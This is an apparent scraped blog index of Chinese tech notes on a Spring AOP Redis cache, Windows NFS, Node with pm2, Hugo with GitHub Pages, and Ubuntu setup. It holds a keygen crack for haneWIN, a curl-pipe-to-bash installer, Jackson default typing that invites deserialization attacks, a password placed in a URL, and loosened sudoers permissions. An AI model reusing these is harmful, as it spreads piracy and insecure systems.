targetMethod; } public Object generateKeyBySpEL(String spELString, ProceedingJoinPoint joinPoint) { MethodSignature methodSignature = (MethodSignature) joinPoint.getSignature(); String[] paramNames = nameDiscoverer.getParameterNames(methodSignature.getMethod()); Expression expression = parser.parseExpression(spELString); EvaluationContext context = new StandardEvaluationContext(); Object[] args = joinPoint.getArgs(); for (int i = 0; i \u0026lt; args.length; i++) { context.setVariable(paramNames[i], args[i]); } return expression.getValue(context); } } 注意这里的queryCache和ClearCache，里面切点表达式\n分别对应上面自定义的两个AopCacheEnable和AopCacheEvict。\n然后在环绕通知的queryCache方法执行前后时\n获取被切方法的参数，参数中的key，然后根据key去redis中去查询\nService层 redis服务接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public interface RedisService { void set(String key, Object value); void set(String key, Object value, long expire); Object get(String key); void expire(String key, long expire); void delete(String key); // 由于dao接口同时继承了MongoRepository和GenericItemDao， // 所以这边写接口调用他们防止继承冲突 PortalItem insertItem(PortalItem item, ItemTypeEnum type); PortalItem saveItem(PortalItem item, ItemTypeEnum type); void deleteItem(PortalItem item, ItemTypeEnum type); } AopCacheEnable测试\n1 2 3 4 public interface ModelItemDao extends MongoRepository\u0026lt;ModelItem,String\u0026gt;, GenericItemDao\u0026lt;ModelItem\u0026gt; { @AopCacheEnable(key = \u0026#34;#id\u0026#34;, group = ItemTypeEnum.ModelItem) ModelItem findFirstById(String id); } AopCacheEvict测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 @Service(\u0026#34;redisService\u0026#34;) public class RedisServiceImpl implements RedisService { @Autowired private RedisTemplate\u0026lt;String, Object\u0026gt; redisTemplate; @Autowired GenericService genericService; @Override public void set(String key, Object value) { redisTemplate.opsForValue().set(key, value); } @Override public void set(String key, Object value, long expire) { redisTemplate.opsForValue().set(key, value, expire, TimeUnit.SECONDS); } @Override public Object get(String key) { return redisTemplate.opsForValue().get(key); } @Override public void expire(String key, long expire) { redisTemplate.expire(key, expire, TimeUnit.SECONDS); } @Override public void delete(String key) { redisTemplate.delete(key); } @Override public PortalItem insertItem(PortalItem item, ItemTypeEnum type) { GenericItemDao itemDao = (GenericItemDao)genericService.daoFactory(type).get(\u0026#34;itemDao\u0026#34;); PortalItem result = (PortalItem)itemDao.insert(item); return result; } @Override @AopCacheEvict(key = \u0026#34;#item.id\u0026#34;, group = \u0026#34;#type\u0026#34;) public PortalItem saveItem(PortalItem item, ItemTypeEnum type) { GenericItemDao itemDao = (GenericItemDao)genericService.daoFactory(type).get(\u0026#34;itemDao\u0026#34;); PortalItem result = (PortalItem)itemDao.save(item); return result; } @Override public void deleteItem(PortalItem item, ItemTypeEnum type) { GenericItemDao itemDao = (GenericItemDao)genericService.daoFactory(type).get(\u0026#34;itemDao\u0026#34;); itemDao.delete(item); } } 测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void aopFindTest(){ for (int i = 0; i \u0026lt; 5; i++) { ModelItem modelItem = modelItemDao.findFirstById(\u0026#34;3f6857ba-c2d2-4e27-b220-6e5367803a12\u0026#34;); System.out.println(modelItem); } } @Test public void aopSaveTest(){ ModelItem modelItem = modelItemDao.findFirstById(\u0026#34;3f6857ba-c2d2-4e27-b220-6e5367803a12\u0026#34;); modelItem.setThumbsUpCount(50); redisService.saveItem(modelItem,ItemTypeEnum.ModelItem); } 遇到的问题 问题：\nCould not safely identify store assignment for repository candidate interface 条件： 使用了Spring data jpa 作为持久层框架并同时使用starter引入了Elasticsearch或Redis依赖包。\n原因： RedisRepositoriesAutoConfiguration或ElasticsearchRepositoriesAutoConfiguration 里面的注解@ConditionalOnProperty会判断 spring.data.redis/elasticsearch.repositories.enabled 这个配置项是否存在。若存在会自动扫描继承org.springframework.data.repository.Repository的实体Repository接口。\n解决办法：\n1 2 3 4 5 6 7 8 spring: data: redis: repositories: enabled: false elasticsearch: repositories: enabled: false 问题：\nRedis获取缓存异常 Resolved [java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.alibaba.fastjson.JSONObject]\n出现场景：\nSpringBoot项目中使用Redis来进行缓存。把数据放到缓存中时没有问题，但从缓存中取出来反序列化为对象时报错：“java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to xxx”。（xxx为反序列化的目标对象对应的类。）\n只有这个类里有其他对象字段才会报这个问题，如果这个类里都是初始的类型（比如：Integer，String）则不会报这个错误。\n只要用到Redis序列化反序列化的地方都会遇到这个问题，比如：RedisTemplate，Redisson，@Cacheable注解等。\n原因：\nSpringBoot 的缓存使用 jackson 来做数据的序列化与反序列化，如果默认使用 Object 作为序列化与反序列化的类型，则其只能识别 java 基本类型，遇到复杂类型时，jackson 就会先序列化成 LinkedHashMap ，然后再尝试强转为所需类别，这样大部分情况下会强转失败。\n解决方法：\n出现这种异常，需要自定义ObjectMapper，设置一些参数，而不是直接使用Jackson2JsonRedisSerializer类中黙认的ObjectMapper，看源代码可以知道，Jackson2JsonRedisSerializer中的ObjectMapper是直接使用new ObjectMapper()创建的，这样ObjectMapper会将Redis中的字符串反序列化为java.util.LinkedHashMap类型，导致后续Spring对其进行转换成报错。其实我们只要它返回Object类型就可以了。\n修改RedisTemplate这个bean的valueSerializer，设置默认类型。\n参考博客：\nhttps://blog.51cto.com/knifeedge/5010643\n修改配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Configuration public class RedisConfig { @Bean public RedisTemplate\u0026lt;String, Object\u0026gt; template(RedisConnectionFactory factory) { // 创建RedisTemplate\u0026lt;String, Object\u0026gt;对象 RedisTemplate\u0026lt;String, Object\u0026gt; template = new RedisTemplate\u0026lt;\u0026gt;(); // 配置连接工厂 template.setConnectionFactory(factory); // redis key 序列化方式使用stringSerial template.setKeySerializer(new StringRedisSerializer()); // redis value 序列化方式自定义，使用jackson会出现转换类型的错误 // template.setValueSerializer(new GenericFastJsonRedisSerializer()); template.setValueSerializer(valueSerializer()); // redis hash key 序列化方式使用stringSerial template.setHashKeySerializer(new StringRedisSerializer()); // redis hash value 序列化方式自定义，使用jackson会出现转换类型的错误 // template.setHashValueSerializer(new GenericFastJsonRedisSerializer()); template.setHashValueSerializer(valueSerializer()); return template; } private RedisSerializer\u0026lt;Object\u0026gt; valueSerializer() { Jackson2JsonRedisSerializer\u0026lt;Object\u0026gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer\u0026lt;\u0026gt;(Object.class); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); // 此项必须配置，否则如果序列化的对象里边还有对象，会报如下错误： // java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to XXX objectMapper.activateDefaultTyping( objectMapper.getPolymorphicTypeValidator(), ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); // 旧版写法： // objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); jackson2JsonRedisSerializer.setObjectMapper(objectMapper); return jackson2JsonRedisSerializer; } } 问题：\n注解不生效 ==注解生效代码==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 @UserCacheEnable(key = \u0026#34;#email\u0026#34;) public JSONObject getItemUserInfoByEmail(String email) { User user = null; JSONObject userJson = new JSONObject(); if (email.contains(\u0026#34;@\u0026#34;)){ user = userDao.findFirstByEmail(email); } else { user = userDao.findFirstByAccessId(email); if (user != null){ email = user.getEmail(); } else { userJson.put(\u0026#34;name\u0026#34;, email); userJson.put(\u0026#34;email\u0026#34;, null); userJson.put(\u0026#34;accessId\u0026#34;, null); userJson.put(\u0026#34;image\u0026#34;, null); return userJson; } } JSONObject userInfo = getInfoFromUserServer(email); userJson.put(\u0026#34;name\u0026#34;, userInfo.getString(\u0026#34;name\u0026#34;)); // userJson.put(\u0026#34;id\u0026#34;, user.getId()); userJson.put(\u0026#34;email\u0026#34;, user.getEmail()); userJson.put(\u0026#34;accessId\u0026#34;, user.getAccessId()); // userJson.put(\u0026#34;image\u0026#34;, user.getAvatar().equals(\u0026#34;\u0026#34;) ? \u0026#34;\u0026#34; : htmlLoadPath + user.getAvatar()); userJson.put(\u0026#34;image\u0026#34;, userInfo.getString(\u0026#34;avatar\u0026#34;)); return userJson; } ==注解失效代码==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @UserCacheEnable(key = \u0026#34;#email\u0026#34;) public JSONObject getInfoFromUserServer(String email){ // return getInfoFromUserServerPart(email); JSONObject jsonObject = new JSONObject(); try { RestTemplate restTemplate = new RestTemplate(); String userInfoUrl = \u0026#34;http://\u0026#34; + userServer + \u0026#34;/user/\u0026#34; + email + \u0026#34;/\u0026#34; + userServerCilent + \u0026#34;/\u0026#34; + userServerCilentPWD; HttpHeaders headers = new HttpHeaders(); MediaType mediaType = MediaType.parseMediaType(\u0026#34;application/json;charset=UTF-8\u0026#34;); headers.setContentType(mediaType); headers.set(\u0026#34;user-agent\u0026#34;, \u0026#34;portal_backend\u0026#34;); HttpEntity httpEntity = new HttpEntity(headers); ResponseEntity\u0026lt;JSONObject\u0026gt; response = restTemplate.exchange(userInfoUrl, HttpMethod.GET, httpEntity, JSONObject.class); JSONObject userInfo = response.getBody().getJSONObject(\u0026#34;data\u0026#34;); String avatar = userInfo.getString(\u0026#34;avatar\u0026#34;); if(avatar!=null){ // avatar = \u0026#34;/userServer\u0026#34; + avatar; //修正avatar前面加了/userServer // avatar = avatar.replaceAll(\u0026#34;/userServer\u0026#34;,\u0026#34;\u0026#34;); genericService.formatUserAvatar(avatar); } userInfo.put(\u0026#34;avatar\u0026#34;,avatar); userInfo.put(\u0026#34;msg\u0026#34;,\u0026#34;suc\u0026#34;); return userInfo; }catch(Exception e){ log.error(e.getMessage()); // System.out.println(e.fillInStackTrace()); jsonObject.put(\u0026#34;msg\u0026#34;,\u0026#34;no user\u0026#34;); } return jsonObject; } 原因：\nSpring AOP 注解为什么失效？\n如下面几种场景\n1、Controller直接调用Service B方法：Controller \u0026gt; Service A\n在Service A 上加@Transactional的时候可以正常实现AOP功能。\n2、==Controller调用Service A方法，A再调用B方法：Controller \u0026gt; Service A \u0026gt; Service B==\n在Service B上加@Transactional的时候不能实现AOP功能，因为==在Service A方法中调用Service B方法想当于使用this.B()，this代表的是Service类本身，并不是真实的代理Service对象==，所以这种不能实现代理功能。\n所以，如果不是直接调用的方式，是不能实现代理功能的，非常需要注意。\n","permalink":"https://chance7bin.github.io/posts/design/spring-aop-%E5%AE%9E%E7%8E%B0-redis-%E7%BC%93%E5%AD%98%E5%88%87%E9%9D%A2/","summary":"Spring AOP 实现 Redis 缓存切面 @EnableCaching spring boot提供了比较简单的缓存方案。只要使用 @EnableCaching 即可完成简单的缓存功能。 https://blog.csdn.net/micro_hz/article/details/76599632 参考博客 Spring的面向切面编程（AOP） Spring AOP","title":"参考资料"},{"content":" 需求：\n需要在k8s中使用到NFS，应该是在linux中配置nfs的，但是由于是在windows开发，所以有了在windwos配置nfs的需求\n1.安装haneWIN HaneWin NFS Server 是一个可以帮助快速搭建NFS服务器的软件\nhttps://www.hanewin.net/nfs-e.htm\n2.破解haneWIN haneWIN NFS Server 1.2.10 注册机下载： haneWIN NFS Server Keygen.7z (8265) (解压密码：astray.cn)\n运行注册机，输入Name，点击左边的按钮，生成Serial\n打开NFS Server，在注册界面输入注册机生成的License key和Your name，并点击Register\n点击help - About 查看是否注册成功\n3.配置exports文件 1 2 # exports example E:\\opengms-lab\\container\\nfs -public 上述配置的意思是将E:\\opengms-lab\\container\\nfs目录共享出去\n将该exports文件覆盖到软件的安装位置\n其他配置参考\n4.linux挂载设置 创建目录\n1 [root@localhost ~]# mkdir /opt/windowsNFS 挂载\n1 [root@localhost ~]# mount -t nfs 172.21.212.240:/e/opengms-lab/container/nfs /opt/windowsNFS 若无nfs功能\n1 2 3 [root@localhost cdrom]# yum install -y nfs-utils #安装nfs功能 #需要联网或者配置本地yum源 5.挂载不上的可能原因 1 2 [root@clustermaster opt]# mount -t nfs 172.21.212.240:/e/opengms-lab/container/nfs /opt/windowsNFS mount.nfs: Connection timed out 防火墙惹得祸：需要禁用防火墙\n设置windows防火墙的入栈规则（TCP，UDP） （另外对配置文件规则，就看你的网络连接是公用、专用、域的哪种了） \u0026lt;经验证，使用hanWinNFS或windows自带的NFS服务 都是仅开放111,1058,2049 就可以了\u0026gt;\n到这里基本就ok了，但正式给某学校应用时发现还是不得，后来发现学校做了阻止策略中把端口全部禁止了，要把禁止策略中的 111,1058,2049给去掉就可以了。\n6.检查挂载是否有问题 mount -a 可跳过， 直接用 df -h 查看\n1 [root@localhost ~]# mount -a 重启检查目录是否挂载\n1 2 3 4 5 6 7 8 9 10 [root@localhost ~]# df -h 文件系统 容量 已用 可用 已用% 挂载点 /dev/mapper/centos-root 47G 7.5G 40G 16% / devtmpfs 895M 0 895M 0% /dev tmpfs 911M 0 911M 0% /dev/shm tmpfs 911M 28M 884M 4% /run tmpfs 911M 0 911M 0% /sys/fs/cgroup /dev/sda1 1014M 170M 845M 17% /boot tmpfs 183M 12K 183M 1% /run/user/42 172.21.212.240:/e/opengms-lab/container/nfs 782G 684G 99G 88% /opt/windowsNFS 7.linux无法写入文件 具体做法：\n1.在haneWIN NFS Server的exports文件中增加 -maproot:0\n2.重新挂载\n1 [root@clustermaster /]# umount 172.21.212.240:/e/opengms-lab/container/nfs 取消挂载后原本挂载的文件夹可能会出现错误\n1 2 3 4 5 6 7 8 [root@clustermaster opt]# ll ls: 无法访问windowsNFS: 失效文件句柄 总用量 4 drwxr-xr-x 3 root root 17 2月 8 10:48 cni drwx--x--x 4 root root 28 2月 7 20:14 containerd drwxr-xr-x 5 root root 4096 4月 27 20:59 k8s drwxr-xr-x. 2 root root 6 9月 7 2017 rh d?????????? ? ? ? ? ? windowsNFS 需执行以下操作修复文件夹\n1 2 3 4 5 6 7 8 [root@clustermaster opt]# umount -l /opt/windowsNFS [root@clustermaster opt]# ll 总用量 4 drwxr-xr-x 3 root root 17 2月 8 10:48 cni drwx--x--x 4 root root 28 2月 7 20:14 containerd drwxr-xr-x 5 root root 4096 4月 27 20:59 k8s drwxr-xr-x. 2 root root 6 9月 7 2017 rh drwxr-xr-x 2 root root 6 5月 10 15:36 windowsNFS 再次挂载nfs\n1 [root@clustermaster opt]# mount -t nfs 172.21.212.240:/e/opengms-lab/container/nfs /opt/windowsNFS ","permalink":"https://chance7bin.github.io/posts/note/windows%E9%85%8D%E7%BD%AEnfs/","summary":"需求： 需要在k8s中使用到NFS，应该是在linux中配置nfs的，但是由于是在windows开发，所以有了在windwos配置nfs的需求","title":"Windows配置NFS"},{"content":"linux 解压 tar 文件 要在Linux上解压缩.tar文件，可以使用以下命令：\ntar -xvf file.tar\n这将解压缩.tar文件并将其提取到当前目录中。您可以将“file.tar”替换为您要解压缩的文件的实际名称。\n此外，您可以使用以下选项来指定解压缩的位置和/或将解压缩的文件重定向到另一个文件：\n-C：指定要解压缩的目标目录。例如，要将文件提取到“/home/user/files/”目录中，请使用以下命令：\narduino\n1 tar -xvf file.tar -C /home/user/files/ -f：指定要解压缩的文件名。这个选项必须出现在命令行的最后一个。\n-O：将解压缩的文件重定向到标准输出。例如，要将文件提取并打印到屏幕上，请使用以下命令：\nmathematica\n1 tar -xvf file.tar -O 请注意，在解压缩.tar.gz文件时，您可以使用“z”选项来启用gzip压缩：\ntar -xzvf file.tar.gz\n同样，您可以使用“j”选项来启用bzip2压缩：\ntar -xjvf file.tar.bz2\nubuntu 安装nvm 要在Ubuntu上安装nvm（Node Version Manager），可以按照以下步骤操作：\n首先，使用curl命令下载nvm安装脚本。您可以使用以下命令：\nbash\n1 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash 上述命令会下载nvm安装脚本并在bash shell中运行。\n安装脚本运行后，需要注销当前的终端并重新登录才能使nvm生效。您也可以运行以下命令来使nvm生效：\nbash\n1 source ~/.bashrc 这将重新加载bash shell并使nvm可用。\n安装完成后，您可以使用以下命令来安装Node.js：\nnvm install node\n这将安装最新版本的Node.js。您还可以安装指定版本的Node.js，例如：\nnvm install 14.17.6\n这将安装Node.js的14.17.6版本。\n使用以下命令来验证Node.js是否已正确安装：\nnode -v\n这将显示已安装的Node.js版本号。\n注意：上述步骤假设您正在使用bash shell。如果您使用的是其他shell，请相应地更改命令。\nubuntu安装pm2 要在Ubuntu上安装pm2，可以按照以下步骤操作：\n首先，请确保您已经安装了Node.js和npm。您可以使用以下命令来检查它们是否已安装：\nnode -v npm -v\n如果它们没有安装，请按照适当的方式安装它们。\n安装pm2，可以使用npm包管理器来完成。在终端中运行以下命令：\nnpm install pm2 -g\n这将使用npm全局安装pm2。\n安装完成后，您可以使用以下命令来验证是否已正确安装pm2：\ncss\n1 pm2 --version 这将显示已安装的pm2版本号。\n现在，您可以使用pm2启动Node.js应用程序。例如，要使用pm2启动名为myapp.js的应用程序，请使用以下命令：\nsql\n1 pm2 start myapp.js 这将启动应用程序并使用pm2管理它。您可以使用以下命令来查看所有正在运行的应用程序：\npm2 list\n您可以使用其他命令，如pm2 restart、pm2 stop和pm2 delete来管理应用程序。\n注意：上述步骤假设您已经正确设置了Node.js应用程序并已准备好使用pm2来管理它们。如果您需要设置应用程序，请按照适当的方式完成。\nubuntu中使用pm2启动node项目 要在Ubuntu中使用pm2启动Node.js项目，您可以按照以下步骤操作：\n首先，请确保您已经安装了Node.js和npm。您可以使用以下命令来检查它们是否已安装：\nnode -v npm -v\n如果它们没有安装，请按照适当的方式安装它们。\n在您的Node.js项目目录中，使用以下命令安装所有依赖项：\nnpm install\n这将安装项目所需的所有npm包。\n安装pm2，可以使用npm包管理器来完成。在终端中运行以下命令：\nnpm install pm2 -g\n这将使用npm全局安装pm2。\n现在，您可以使用pm2启动Node.js应用程序。例如，要使用pm2启动名为bin/www的应用程序，请使用以下命令：\n1 pm2 start bin/www 这将启动应用程序并使用pm2管理它。您可以使用以下命令来查看所有正在运行的应用程序：\npm2 list\n您可以使用其他命令，如pm2 restart、pm2 stop和pm2 delete来管理应用程序。\n如果您需要配置pm2以在系统启动时自动启动应用程序，请使用以下命令：\npm2 startup systemd\n这将创建一个systemd服务，以在系统启动时启动pm2并启动您的应用程序。执行此命令后，pm2将为您提供一条命令，您需要复制并在终端中运行它以完成服务的创建。\n注意：上述步骤假设您已经正确设置了Node.js应用程序并已准备好使用pm2来管理它们。如果您需要设置应用程序，请按照适当的方式完成。\n","permalink":"https://chance7bin.github.io/posts/note/ubuntu%E9%83%A8%E7%BD%B2node%E9%A1%B9%E7%9B%AE/","summary":"linux 解压 tar 文件 要在Linux上解压缩.tar文件，可以使用以下命令： tar -xvf file.tar 这将解压缩.tar文件并将其提取到当前目录中。您可以将“file.t","title":"ubuntu部署node项目"},{"content":"初见Hugo Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。\n1. 安装 Hugo 到 Hugo Releases 下载适合你的操作系统的版本。\nWindows用户选择windows-amd64.zip\n下载下来的是一个exe文件，需打开cmd进行操作\n1 2 E:\\Projects\\hugo_0.111.2_windows-amd64\u0026gt;hugo version hugo v0.111.2-4164f8fef9d71f50ef3962897e319ab6219a1dad windows/amd64 BuildDate=2023-03-05T12:32:20Z VendorInfo=gohugoio 2. 创建一个新的网站 1 2 // 在命令行输入如下命令会在当前路径下创建一个新的网站文件夹 hugo new site quickstart 3. 添加一个主题 添加主题也可以放在后面\n主题\nhttps://github.com/nanxiaobei/hugo-paper\nhttps://github.com/adityatelange/hugo-PaperMod\nHUGO官方搭建的theme主题站有大量的开源主题可供选择\n基本上所有的主题都自带安装的方法\n这里我选择了一个主题进行演示\nhttps://themes.gohugo.io/themes/hugo-theme-charlolamode/\n在网页下方的说明内，根据步骤安装主题即可\n总结\n1 2 3 cd quickstart git init git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke 在根目录下的 config.toml 文件中添加一行\n1 echo \u0026#39;theme = \u0026#34;ananke\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.toml 4. 添加一个新的文章 1 2 hugo new posts/my-first-post.md hugo new test.md 创建的新文章都会放在 content 文件夹下\n5. 启动 Hugo 服务器 使用命令启动服务器\n1 hugo server 在浏览器输入localhost:1313即可查看生成的网站\n注意刚才添加的md并没有显示出来，是因为生成的md是drift，hugo默认忽略drift的文档，需在启动时添加-D参数\n1 hugo server -D --theme 选择哪个皮肤; --buildDrafts 由于想显示我们的内容，包括设置了 draft 草稿状态的内容。 部署 Hugo 作为一个 Github Pages Github Pages 本质上是一个静态网站托管系统，你可以使用它为你的每一个仓库制作一个静态网页入口\n1. 创建一个 Github 仓库 首先再Github上创建一个 Repository，命名为Github名字.github.io，例如我的仓库：GoodmanBin.github.io，这样就可以生成一个用户页面\n2. 在本地构建Hugo静态网站 注意！！！\n在生成静态页面之前要把config.toml文件中的baseURL修改为自己博客的网址\n1 baseURL = \u0026#39;https://GoodmanBin.github.io/\u0026#39; 执行命令\n1 hugo 输入hugo就可以生成public文件夹，这个文件夹可以部署到云服务器或者托管到github上，\n注意：输入hugo的生成方式只会往public文件夹里添加内容，但是不会删除外部已经不存在而public里面还存在的文件\n所以一般用hugo -F --cleanDestinationDir命令，表示每次生成的public都是全新的，会覆盖原来的。\n在命令执行后，出现一个public文件夹，里面就是网站的静态页面文件\n进入public文件夹，将public文件夹的内容上传到github仓库中\n1 2 3 4 5 6 cd public git init ##初始化仓库 git remote add origin https://github.com/GoodmanBin/GoodmanBin.github.io.git ##链接远程仓库 git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master 将public文件夹推送上去之后直接访问GoodmanBin.github.io会显示404，需到项目中勾选上Use your GitHub Pages website才可访问\n在此之后更新文章，使用hugo生成新的静态页面，并使用git push进行同步\n1 2 3 4 5 cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push 3. 解决 hugo 中关于 integrity 的错误 问题描述\n在 Github Pages 上部署 Hugo 博客后，网站样式丢失，打开浏览器 F12 控制台可以发现错误：Failed to find a valid digest in the 'integrity' attribute for resource \u0026quot;xxx.css\u0026quot;, The resource has been blocked.\n解决方法\n在 themes\\PaperMod\\layouts\\partials 文件夹下找到一个 head.html 文件，发现里面确实有 integrity=\u0026quot;{{ $stylesheet.Data.Integrity }}\u0026quot; 这么一句代码，把它改为 integrity=\u0026quot;\u0026quot; 然后重新发布\nHugo引入图片问题 直接使用typora的相对路径在生成静态网站的时候图片无法显示出来\nHugo的图片展示逻辑：\nHugo博客的根目录有一个static目录，这个static目录就是用来存放一些静态文件，比如图片、css、js文件等。 执行hugo命令的时候，会把static目录下的子目录或文件复制到public目录下。比如我在static下添加了一个img子目录，并且在img子目录放了图片，那执行hugo命令后，就会把static\\img文件的内容拷贝到public\\img里面。 大家都知道Hugo博客网站展示的其实是public下的内容，因此markdown文章里引用图片的时候，得引用pubic下的图片才可以。 具体操作非常简单，分2步：\n在static目录下创建img子目录，把markdown要使用的图片放在static\\img目录里。 在markdown文件里，按照如下格式引用图片(这里假设图片名称叫wechat.png)。这样最终public目录下生成的静态页面就可以引用到public\\img下的图片了。 1 ![](/img/wechat.png) 注意：\n严格注意路径：只能写成 /img/imagename.png 的形式（注意 / 和 \\ 的区别)\n可能是当前主题不支持的原因，嵌入图片的代码只能写成这样：![imagename](/img/imagename.png)；\u0026lt;img src=\u0026quot;\u0026quot; alt=\u0026quot;\u0026quot; style=\u0026quot;zoom:50%;\u0026quot; /\u0026gt; 这种格式的修改图片缩放比例的代码也是不能用的\n存放图片的文件夹不能有空格\n还可以用图床\nTypora配置图床 GitHub创建仓库并获取仓库Token 下载PicGo并安装 GitHub配置 设置参数说明：\n设定仓库名：填入你上面创建的仓库名，格式为：用户名/仓库名；\n设定分支名：一般填写 master 即可；\n设定 Token：将上一步 Github 配置中得到的 Token 粘贴进去；\n指定存储路径：图片在 Github 仓库中的存储路径，例如本人是：blog/202303/\n设定自定义域名：此处直接设置 jsDelivr 加速的访问地址，例如本人是：https://cdn.jsdelivr.net/gh/chance7bin/img-repo@main/\ngh 表示来自 Github 的仓库 chance7bin/img-repo 仓库的具体位置 main 仓库的分支 到此，配置过程已完成。\nPicGo配置 腾讯云COS https://cloud.tencent.com/developer/article/1834573 https://cloud.tencent.com/developer/article/2175760?from=15425\n阿里云OSS 阿里云OSS PicGo 配置图床教程 超详细\n配置Typora 偏好设置 → 图像 → 插入图片时：上传图片 → 上传服务设定：上传服务选择PiacGo，PicGo路径选择软件安装路径 → 配置完成\nObisidian配置图床 Obisidian对img的兼容不是很好\n打开 Obsidian 按箭头标识数字顺序：设置 =》 第三方插件 =》 关闭安全模式 =》 浏览社区插件\n搜索：Image auto upload Plugin\n安装后打开选项，默认什么都不要改。\n其中最后一项 PicGo server 也是默认填好的，如果没有，就在 PicGo 设置，默认都不要动。\n","permalink":"https://chance7bin.github.io/posts/note/%E4%BD%BF%E7%94%A8-hugo-+-github-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","summary":"初见Hugo Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。 1. 安装 Hugo 到 Hugo Releases 下载适合你的操作系统的版本。 Wind","title":"使用 Hugo + Github 搭建个人博客"},{"content":"Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351\nhttps://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n打开终端输入命令下载vim工具\n1 sudo apt-get install vim 1.备份 /etc/apt/sources.list\n1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list\n打开 /etc/apt/sources.list：\n1 sudo vim /etc/apt/sources.list 在命令模式下输入 ggdG，删除全部内容.\n在输入模式下，粘贴复制下列内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse 上面这个会报错\n仓库 “https://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-security Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。\n解决方法：https://blog.csdn.net/gezongbo/article/details/121056781\n适用于ubuntu18.04\n使用aliyun，将sources.list内容修改为下面内容\n1 2 3 4 5 deb http://mirrors.aliyun.com/ubuntu bionic main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-updates main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-security main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-proposed main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-backports main multiverse restricted universe 适用于ubuntu20.04\n使用aliyun，将sources.list内容修改为下面内容\n1 2 3 4 5 deb http://mirrors.aliyun.com/ubuntu focal main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-updates main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-security main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-proposed main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-backports main multiverse restricted universe 保存退出.\n3.更新\n1 sudo apt update 设置root密码 Ubuntu的默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码\n终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了\n如何解决：不在 sudoers 文件中此事将被报告？\n1.首先切换到root用户下，输入当前用户账号密码\nsu - root\n2.输入sudo相关命令\nchmod 740 /etc/sudoers\nsudo gedit /etc/sudoers\n3.添加权限\n找到\n1 2 # Allow members of group sudo to execute any command %sudo ALL=(ALL) ALL 在下面添加一行，如下\nxx ALL=(ALL) ALL (将此处的XX修改为出现该问题的用户名！）\r拓展：\nsudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码\nLinux命令su、sudo、sudo su、sudo -i使用和区别\n提升用户权限 https://www.cnblogs.com/rnckty/p/5741956.html\nUbuntu默认root密码\nhttps://blog.csdn.net/jiangshuanshuan/article/details/95715837\n安装Java Java推荐用安装包安装 之后安装Tomcat比较方便\n安装包：\nhttps://blog.csdn.net/qq_34412086/article/details/88035820\n1.上传安装包jdk-8u301-linux-x64.tar.gz\n2.解压压缩包\ntar -zxvf jdk-8u301-linux-x64.tar.gz\n3.配置环境变量\nvim /etc/profile\n在末尾加入如下配置\n1 